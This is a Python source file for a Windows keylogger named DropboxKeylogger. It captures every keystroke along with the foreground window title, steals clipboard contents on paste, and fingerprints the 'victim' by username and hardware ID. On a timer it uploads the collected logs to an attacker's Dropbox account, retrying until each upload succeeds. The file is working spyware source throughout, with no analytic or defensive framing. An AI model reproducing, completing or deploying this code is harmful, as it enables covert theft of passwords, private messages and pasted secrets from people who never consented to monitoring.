import ctypes
import ctypes.wintypes
import time
import sys
import os
import win32clipboard
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor
from collections import deque, defaultdict
from pynput import keyboard
import subprocess
import dropbox
import time


GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
GetForegroundWindow.argtypes = []
GetForegroundWindow.restype = ctypes.wintypes.HWND

GetWindowTextA = ctypes.windll.user32.GetWindowTextA
GetWindowTextA.argtypes = [ctypes.wintypes.HWND, ctypes.wintypes.LPSTR, ctypes.c_int]
GetWindowTextA.restype = ctypes.c_int

CTRL_V = '\x16'


class DropboxKeylogger:

    special_keys = {
        keyboard.Key.space: ' ',
        keyboard.Key.ctrl: '[ctrl]',
        keyboard.Key.shift: '[shift]',
        keyboard.Key.caps_lock: '[capslock]',
        keyboard.Key.delete: '[del]',
        keyboard.Key.backspace: '[backspace]',
        keyboard.Key.enter: '[enter]',
        keyboard.Key.up: '[up]',
        keyboard.Key.down: '[down]',
        keyboard.Key.left: '[left]',
        keyboard.Key.right: '[right]',
        keyboard.Key.home: '[home]',
        keyboard.Key.end: '[end]',
    }

    @staticmethod
    def get_clipboard_contents() -> str:
        # can result in pywintypes.error (5, 'OpenClipboard', 'Access is denied.')
        win32clipboard.OpenClipboard()
        contents = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return contents

    def __init__(self, config) -> None:
        # config
        self.config = config
        # exfiltration
        def exfiltration_function(buffer, window_title) -> bool:
            try:
                curr_timestamp_ms = round(time.time() * 1000)
                output_filename = f'{curr_timestamp_ms}_{window_title}.txt'
                dropbox.Dropbox(self.config['dropbox_token']).files_upload(
                    buffer.encode('utf-8'),
                    (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
                )
                return True
            except Exception as e:
                print(e)
                return False
        self.exfiltration_function = exfiltration_function
        # special substr replacements
        self._victim_username = os.getlogin()
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)
        # state
        self._keylogs: defaultdict[deque[str]] = defaultdict(lambda: deque(['','','']))
        self._paste_data: defaultdict[deque[str]] = defaultdict(lambda: deque(['','','']))
        self._last_foreground_window_title = ''
        self._last_key_pressed = None
        self._is_capslock_on = False
        # lock
        self._lock = Lock()

    def _exfiltration_worker(self) -> None:
        # wrap custom exfiltration function
        # run it in a thread up to max_threads
        # 1 thread per window_title in self._keylogs
        def exfiltrate_until_successful(contents):
            exfiltration_attempt = False
            while exfiltration_attempt is False:
                exfiltration_attempt = self.exfiltration_function(contents, self._last_foreground_window_title)
        def exfiltrate_paste_until_successful(contents):
            exfiltration_attempt = False
            while exfiltration_attempt is False:
                exfiltration_attempt = self.exfiltration_function(contents, '[PASTE DATA] '+self._last_foreground_window_title)
        def exfiltrate_attempt_only_once(contents):
            self.exfiltration_function(contents, self._last_foreground_window_title)
        def exfiltrate_paste_attempt_only_once(contents):
            self.exfiltration_function(contents, '[PASTE DATA] '+self._last_foreground_window_title)
        # exfiltrate 
        while True:
            buffers_to_exfiltrate = []
            paste_data_buffers_to_exfiltrate = []
            with self._lock:
                for buf_deque in self._keylogs.values():
                    if len(buf_deque[0]) > 0:
                        buffers_to_exfiltrate.append(buf_deque.popleft())
                        buf_deque.append('')
                if self.config['enable_clipboard_stealer'] is True:
                    for buf_deque in self._paste_data.values():
                        if len(buf_deque[0]) > 0:
                            paste_data_buffers_to_exfiltrate.append(buf_deque.popleft())
                            buf_deque.append('')
            if self.config['exfiltration_retry_if_fail'] is True:
                ThreadPoolExecutor(self.config['exfiltration_max_threads']).map(
                    exfiltrate_until_successful, buffers_to_exfiltrate)
                if self.config['enable_clipboard_stealer'] is True:
                    ThreadPoolExecutor(self.config['exfiltration_max_threads']).map(
                        exfiltrate_paste_until_successful, paste_data_buffers_to_exfiltrate)
            else:
                ThreadPoolExecutor(self.config['exfiltration_max_threads']).map(
                    exfiltrate_attempt_only_once, buffers_to_exfiltrate)
                if self.config['enable_clipboard_stealer'] is True:
                    ThreadPoolExecutor(self.config['exfiltration_max_threads']).map(
                        exfiltrate_paste_attempt_only_once, paste_data_buffers_to_exfiltrate)
            time.sleep(self.config['exfiltration_interval_ms']/1000)
    
    def _window_tracker_worker(self) -> None:
        # get foreground window every interval
        # update self._last_foreground_window_title
        while True:
            try:
                hwnd = GetForegroundWindow()
                title_buf = ctypes.create_string_buffer(255)
                GetWindowTextA(hwnd, title_buf, 255)
                window_title = title_buf.value.decode()
                with self._lock:
                    self._last_foreground_window_title = window_title
                time.sleep(self.config['window_check_interval_ms']/1000)
            except:
                with self._lock:
                    self._last_foreground_window_title = '_NoName_'
        
    def run(self) -> None:
        def on_press(key) -> None:
            try:
                if key.char == CTRL_V:
                    if self.config['enable_clipboard_stealer'] is True:
                        try:
                            clipboard_contents = self.get_clipboard_contents()
                            with self._lock:
                                self._paste_data[self._last_foreground_window_title][0] += clipboard_contents
                        except Exception as e:
                            # pywintypes error
                            pass
                else:
                    with self._lock:
                        self._keylogs[self._last_foreground_window_title][0] += key.char
            except AttributeError:
                if key in self.special_keys:
                    with self._lock:
                        self._keylogs[self._last_foreground_window_title][0] += self.special_keys[key]
            self._last_key_pressed = key
        # key listener start
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        # window tracker
        window_tracker = Thread(target=self._window_tracker_worker, daemon=True)
        window_tracker.start()
        # exfiltrator
        exfiltrator = Thread(target=self._exfiltration_worker, daemon=True)
        exfiltrator.start()
        # time block, let keyboard_listener run until time is up
        time.sleep(self.config['max_runtime_ms']/1000)
        # stop key listener
        keyboard_listener.stop()
        keyboard_listener.join()
        # attempt to exfiltrate all remaining buffer contents
        for title, deqbufs in [(t, db) for (t, db) in self._keylogs.items() if len(db[0]) > 0]:
            self.exfiltration_function(deqbufs[0], title)
        # exit, automatically kills daemon threads
        sys.exit(0)